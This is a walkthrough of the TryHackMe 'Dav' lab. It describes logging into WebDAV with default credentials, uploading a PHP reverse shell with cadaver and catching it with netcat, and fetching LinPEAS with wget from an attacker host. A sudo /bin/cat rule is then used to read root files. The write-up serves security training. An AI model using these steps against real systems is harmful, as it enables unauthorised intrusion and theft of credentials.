# 📂 TryHackMe — Dav

> **Difficulty:** Easy | **OS:** Linux | **Category:** Web / Privilege Escalation
> **Author:** Aryan Barkhordar

---

## Table of Contents

- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
  * [Port Scanning](#port-scanning)
  * [Web Enumeration](#web-enumeration)
- [Exploitation](#exploitation)
  * [WebDAV Authentication — Default Credentials](#webdav-authentication--default-credentials)
  * [File Upload via Cadaver](#file-upload-via-cadaver)
  * [Reverse Shell Execution](#reverse-shell-execution)
- [Post-Exploitation](#post-exploitation)
  * [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
  * [Automated Enumeration — LinPEAS](#automated-enumeration--linpeas)
  * [Sudo Misconfiguration — `/bin/cat`](#sudo-misconfiguration--bincat)
- [Flags](#flags)
- [Summary](#summary)

---

## Overview

**Dav** is a TryHackMe machine centred around a misconfigured WebDAV service running on top of Apache. The attack chain begins with directory enumeration revealing a password-protected `/webdav` endpoint, which falls to well-known default credentials. WebDAV file upload capabilities are then abused via the `cadaver` client to plant a PHP reverse shell, granting an initial foothold. Privilege escalation is straightforward — a sudo rule permits running `/bin/cat` as root without a password, which is used to read the root flag directly.

---

## Reconnaissance

### Port Scanning

An initial `nmap` scan of the target revealed a single open port:

```
PORT   STATE SERVICE
80/tcp open  http
```

> **Key Finding:** Only HTTP was exposed — the entire attack surface resided on the web server.

---

### Web Enumeration

Navigating to `http://<TARGET>` presented the default Apache2 Ubuntu landing page, offering no obvious attack surface from the root path.

**Directory Bruteforcing with Gobuster:**

```
gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt
```

```
/webdav   (Status: 401)
```

> **Key Finding:** A `/webdav` directory was identified, returning a `401 Unauthorized` — indicating HTTP Basic Authentication was in place. WebDAV (Web Distributed Authoring and Versioning) is a protocol extension of HTTP that allows file management over the web.

---

## Exploitation

### WebDAV Authentication — Default Credentials

Browsing to `http://<TARGET>/webdav` triggered an HTTP authentication prompt. Research into common WebDAV default credentials yielded:

```
Username: wamp
Password: xampp
```

These credentials were accepted, granting access to the WebDAV directory listing. A file named `password.dav` was present — its contents appeared to be a hashed value. Attempting to crack the hash with John the Ripper did not yield a result, making it a dead end for further credential access.

---

### File Upload via Cadaver

To interact programmatically with the WebDAV service and upload a payload, `cadaver` — a command-line WebDAV client — was used:

```
cadaver http://<TARGET>/webdav
```

After authenticating with the previously discovered credentials, a PHP reverse shell was uploaded to the server using the `put` command:

```
dav:/webdav/> put shell.php
Uploading shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 5494 bytes succeeded.
```

---

### Reverse Shell Execution

With the shell uploaded, a Netcat listener was established:

```
nc -lvnp 4444
```

Navigating to `http://<TARGET>/webdav/shell.php` in the browser triggered the payload, and a reverse shell was received on the listener, providing an interactive session on the target system.

---

## Post-Exploitation

### User Flag

With shell access as `www-data`, the filesystem was enumerated. The user flag was located at:

```
/home/merlin/user.txt
```

```
$ cat /home/merlin/user.txt
THM{REDACTED}
```

---

## Privilege Escalation

### Automated Enumeration — LinPEAS

To identify privilege escalation vectors, LinPEAS was transferred to the target via `wget` and executed:

```
wget http://<ATTACKER>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

The output highlighted a notable sudo rule for the current user.

> **Note:** Running `sudo -l` directly would have surfaced the same finding — LinPEAS made it visually prominent but wasn't strictly necessary here.

---

### Sudo Misconfiguration — `/bin/cat`

The sudo configuration revealed the following entry:

```
(ALL) NOPASSWD: /bin/cat
```

This permitted running `/bin/cat` as root without a password. Since `cat` reads arbitrary files, the root flag could be accessed directly without spawning a root shell:

```
sudo /bin/cat /root/root.txt
```

This returned the root flag, completing the machine.

> **Key Observation:** Granting `NOPASSWD` access to a read utility like `/bin/cat` is a critical misconfiguration — it effectively allows reading any file on the system as root, including `/etc/shadow`.

---

## Flags

| Flag        | Value           |
| ----------- | --------------- |
| 🏳️ **User** | `THM{REDACTED}` |
| 🚩 **Root**  | `THM{REDACTED}` |

---

## Summary

| Stage                    | Technique                                                          |
| ------------------------ | ------------------------------------------------------------------ |
| **Recon**                | `nmap` port scan, `gobuster` directory enumeration                 |
| **Initial Access**       | Default WebDAV credentials (`wamp:xampp`)                          |
| **File Upload**          | PHP reverse shell uploaded via `cadaver`                           |
| **Shell**                | Reverse shell triggered via browser, caught with Netcat            |
| **Privilege Escalation** | `sudo NOPASSWD /bin/cat` → arbitrary root file read                |

---

*Writeup by Aryan Barkhordar*
